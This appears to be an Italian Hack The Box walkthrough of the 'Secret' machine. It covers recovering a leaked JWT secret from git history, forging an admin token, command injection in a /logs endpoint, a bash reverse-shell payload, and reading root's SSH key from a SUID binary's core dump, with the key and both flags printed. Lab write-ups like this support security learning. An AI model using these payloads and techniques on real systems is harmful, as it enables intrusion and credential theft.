**TARGET: 10.10.11.120**

# INFORMATION GATHERING

Iniziamo con un scan [Nmap](Note/Tool/Nmap.md)
```bash
┌──(kali㉿kali)-[~/htb/secret]
└─$ sudo nmap -sSVC 10.10.11.120
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 13:50 CEST
Nmap scan report for 10.10.11.120
Host is up (0.045s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
```

Troviamo 3 porte aperte:

- 22/tcp  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
- 80/tcp  http    nginx 1.18.0 (Ubuntu)
- 3000/tcp open  http    Node.js (Express middleware)

# ENUMERATION
  
Visitando la porta 80, ci viene presentata una pagina che menziona un sistema di autenticazione basato su API. Facendo clic sull'opzione Live Demo in alto a destra nella pagina si accede a `/api` ma viene visualizzato un errore 404. Un'altra opzione interessante si trova in fondo alla pagina dell'indice. Lì abbiamo la possibilità di scaricare il codice sorgente dell'API.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/secret.png)

Estraendo l'archivio scaricato, possiamo vedere che in realtà si tratta di un repository git per la presenza della directory .git.
Poiché è inclusa una directory `.git`, possiamo controllare i log per scoprire quali modifiche sono state apportate al codice che potrebbero darci un suggerimento su dove cercare di andare avanti.

```bash
┌──(kali㉿kali)-[~/htb/secret/local-web]
└─$ ls -la
total 116
drwxrwxr-x   8 kali kali  4096 Sep  3  2021 .
drwxrwxr-x   3 kali kali  4096 Aug  2 14:20 ..
-rw-rw-r--   1 kali kali    72 Sep  3  2021 .env
drwxrwxr-x   8 kali kali  4096 Sep  8  2021 .git
-rw-rw-r--   1 kali kali   885 Sep  3  2021 index.js
drwxrwxr-x   2 kali kali  4096 Aug 13  2021 model
drwxrwxr-x 201 kali kali  4096 Aug 13  2021 node_modules
-rw-rw-r--   1 kali kali   491 Aug 13  2021 package.json
-rw-rw-r--   1 kali kali 69452 Aug 13  2021 package-lock.json
drwxrwxr-x   4 kali kali  4096 Sep  3  2021 public
drwxrwxr-x   2 kali kali  4096 Sep  3  2021 routes
drwxrwxr-x   4 kali kali  4096 Aug 13  2021 src
-rw-rw-r--   1 kali kali   651 Aug 13  2021 validations.js
```

Utilizzando il comando `git log`

```bash
┌──(kali㉿kali)-[~/htb/secret/local-web/.git]
└─$ git log
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
```

Sicuramente il `commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78` è quello che desta maggior interesse in quanto fa riferimento "ragioni di sicurezza " andiamo a visualizzarlo 

```bash
┌──(kali㉿kali)-[~/htb/secret/local-web/.git]
└─$ git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

  Abbiamo un valore di testo in chiaro per la variabile TOKEN_SECRET che è stata modificata in secret nell'ultimo commit. Osservando altri commit possiamo individuare una falla di sicurezza. Più specificamente, negli ultimi commit l'autore ha introdotto un endpoint /logs per visualizzare i file di registro dal server
  
```bash
..<snip>..
+router.get('/logs', verifytoken, (req, res) => {
+    const file = req.query.file;
+    const userinfo = { name: req.user }
+    const name = userinfo.name.name;
+
+    if (name == 'theadmin'){
+        const getLogs = `git log --oneline ${file}`;
+        exec(getLogs, (err , output) =>{
+            if(err){
+                res.status(500).send(err);
+                return

 ..<snip>..
```

Esaminando la funzionalità appena implementata, possiamo individuare una vulnerabilità di command injection poiché la variabile file viene passata senza alcuna sensibilizzazione come argomento a git log che viene eseguito dal
sistema remoto. Tuttavia, per raggiungere questo endpoint è necessaria un'autenticazione basata su token come suggerito dalla chiamata varifytoken e la voce del nome del token deve essere uguale a theadmin . Il sito Web ha affermato che l'API utilizza i token JWT per autenticare gli utenti. Dobbiamo quindi rivedere ulteriormente il codice sorgente per verificare come viene verificato un token JWT al fine di creare un token dannoso per accedere all'endpoint `/logs`

Osservando il codice sorgente scopriamo che `local-web/routes/auth.js` è responsabile della generazione di token per gli utenti che accedono con successo all'endpoint `/login`.

```bash
router.post('/login', async  (req , res) => {
<SNIP>

// create jwt

    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email},
process.env.TOKEN_SECRET )

    res.header('auth-token', token).send(token);
})
```


Esplorando i file al percorso `/htb/secret/local-web/routes` troviamo `verifytoken.js`
dove si fa riferimento al TOKEN_SECRET trovato in precedenza nel commit

```bash
┌──(kali㉿kali)-[~/htb/secret/local-web/routes]
└─$ ls
auth.js  forgot.js  private.js  verifytoken.js

┌──(kali㉿kali)-[~/htb/secret/local-web/routes]
└─$ cat verifytoken.js
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};

```

Bene abbiamo tutte le informazioni necessario per crearci il nostro JWT dannoso.

# GAINING AN INITIAL FOOTHOLD 

Per creare il nostro JWT utilizzeremo il sito [Jwt.io](https://jwt.io)

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/secret2.png)

Una volta craftato il nostro JWT apriamo [BurpSuite](BurpSuite) e intercettiamo una chiamata all'endpoint vulnerabile `/api/logs` che abbiamo trovato prima nel commit e ci aggiungiamo il nostro JWT token
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/secret3.png)
Abbiamo effettuato l'accesso a /api/logs con successo, ma il server ha risposto con un errore 500 Internal Server Error. A giudicare dall'output della pagina abbiamo riscontrato un errore perché non abbiamo specificato un file con il parametro file GET. Come abbiamo scoperto, il parametro file è vulnerabile all'iniezione di comando, quindi proviamo una semplice iniezione di comando `?file=;id` per verificare che l'iniezione funzioni.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/secret4.png)

Perfetto, abbiamo l'output del comando sulla risposta del server, siamo l'utente dasith. Ora possiamo provare a ottenere una shell inversa. Innanzitutto, impostiamo nc sulla nostra macchina.

```bash
┌──(kali㉿kali)-[~/htb/secret]
└─$ nc -lnvp 443
listening on [any] 443 ...
```

e gli passiamo il seguente payload

```bash
 ?file=;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/9001+0>%261'
```

ottenendo cosi la nostra shell

```bash
┌──(kali㉿kali)-[~/htb/secret]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.120] 43640
bash: cannot set terminal process group (1117): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ id
id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
dasith@secret:~/local-web$
```

e ci prendiamo la nostra user flag.

```bash
dasith@secret:~/local-web$ cat /home/dasith/user.txt
cat /home/dasith/user.txt
a63afb05e9dac037d0d681f9e95a1b8f
```

# PRIVESC

Parte del processo di enumerazione è quell di ricercare file con SUID abilitato e per farlo utilizziamo il seguente comando 

SUID è un tipo di autorizzazione che consente agli utenti di eseguire un file con le autorizzazioni di un utente specifico. I file che hanno permessi SUID impostati vengono eseguiti con gli stessi privilegi dell’utente originale. Supponendo di accedere ad un sistema come utente non root e di aver trovato binari appartenenti a root con il bit SUID abilitato quei file (programma o comandi) possono essere eseguiti con privilegi di root senza di fatto esserlo.

```bash
dasith@secret:~/local-web$ find / -perm -u=s 2>/dev/null
..<snip>..
/opt/count
..<snip>..
```

se ci rechiamo in `/opt/` abbiamo anche il codice di questo binario
```bash
dasith@secret:/opt$ cat code.c
..<snip>..

int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}

..<snip>..

```

vediamo una chiamata a coredump.
Coredump è un strumento che fa un backup dei dati creati se si verifica un exception durante l'esecuzione del codice. 

quindi l'idea è quello di andare a leggere id_rsa di root  attraverso count ed interrompere il codice cosi da far creare a core dump un backup che andremmo poi a leggere con `apport-unpack`

```bash
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps
    PID TTY          TIME CMD
   1669 pts/0    00:00:00 bash
   1759 pts/0    00:00:00 count
   1760 pts/0    00:00:00 ps
dasith@secret:/opt$ kill -BUS 1759
dasith@secret:/opt$ fg
./count
Bus error (core dumped)
dasith@secret:/opt$
```

ora coredump salva l'output in `/var/crash`
```bash
dasith@secret:/opt$ ls -la /var/crash/
total 92
drwxrwxrwt  2 root   root    4096 Aug  2 15:01 .
drwxr-xr-x 14 root   root    4096 Aug 13  2021 ..
-rw-r-----  1 root   root   27203 Oct  6  2021 _opt_count.0.crash
-rw-r-----  1 dasith dasith 32071 Aug  2 15:01 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5  2021 _opt_countzz.0.crash
dasith@secret:/opt$
```

```bash
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash
Usage: /usr/bin/apport-unpack <report> <target directory>
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/id_rsa
```

Utilizziamo il comando `string` per stampare le stringhe valide di caratteri visibili di Coredump

```bash
dasith@secret:/tmp/id_rsa$ strings /tmp/id_rsa/CoreDump
..<snip>..

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

..<snip>..
```

e abbiamo la nostra id_rsa di root, la copiamo, gli diamo i premessi necessari e ci colleghiamo tramite ssh 

```bash
┌──(kali㉿kali)-[~/htb/secret]
└─$ nano id_rsa

┌──(kali㉿kali)-[~/htb/secret]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/htb/secret]
└─$ ssh root@10.10.11.120 -i id_rsa
The authenticity of host '10.10.11.120 (10.10.11.120)' can't be established.
ED25519 key fingerprint is SHA256:TMkIYJ5kXqHFji0NCRdDDvYT114MAOOsRgTr5/Xd/GM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.120' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 02 Aug 2024 03:15:29 PM UTC

  System load:           0.0
  Usage of /:            52.7% of 8.79GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             216
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.120
  IPv6 address for eth0: dead:beef::250:56ff:fe94:8fc3


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct 26 15:13:55 2021
root@secret:~# 
```

e ci prediamo la nostra root flag

```bash
root@secret:~# cat root.txt
a1bda81d59175e39fb4b9e7c41df134e
```